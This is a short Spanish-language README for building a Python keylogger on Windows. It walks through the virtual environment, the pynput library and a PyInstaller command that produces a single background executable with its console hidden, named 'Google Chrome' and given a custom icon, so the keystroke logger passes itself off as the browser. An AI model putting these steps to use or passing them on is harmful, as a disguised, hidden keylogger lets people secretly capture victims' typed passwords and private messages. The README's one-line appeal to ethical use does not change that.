# Configuración del Entorno Virtual para Keylogger (Windows)

## Librerías Necesarias
- `pynput` - Para capturar eventos del teclado

`
### 1. Crear el entorno virtual
```powershell
python -m venv venv
```

### 2. Activar el entorno virtual
```powershell
.\venv\Scripts\Activate.ps1
```
*Nota: Si tienes problemas con políticas de ejecución, ejecuta:*
```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
```
*Este comando es permanente y no necesitarás ejecutarlo de nuevo.*

### 3. Instalar las librerías necesarias
```powershell
pip install -r requerimientos.txt
```

*El .exe se creará en la carpeta `dist`*

**Opciones adicionales de PyInstaller:**
- `--onefile`: Crea un solo archivo .exe
- `--windowed`: Oculta la ventana de consola (ejecuta en segundo plano)
- `--icon=icon.ico`: Agrega un icono personalizado

### 4. Crear el .exe
**Comando completo con todas las opciones:**
```powershell
pyinstaller --onefile --windowed --name="Google Chrome" --icon="icono.ico" main.py
```

## Notas Importantes
- Los archivos se guardarán en la carpeta `salidas`
- El keylogger captura teclas normales, espacios, enters, y maneja backspace/delete
- Usa este software de manera ética y legal
- El .exe generado incluye todas las dependencias, no necesita Python instalado
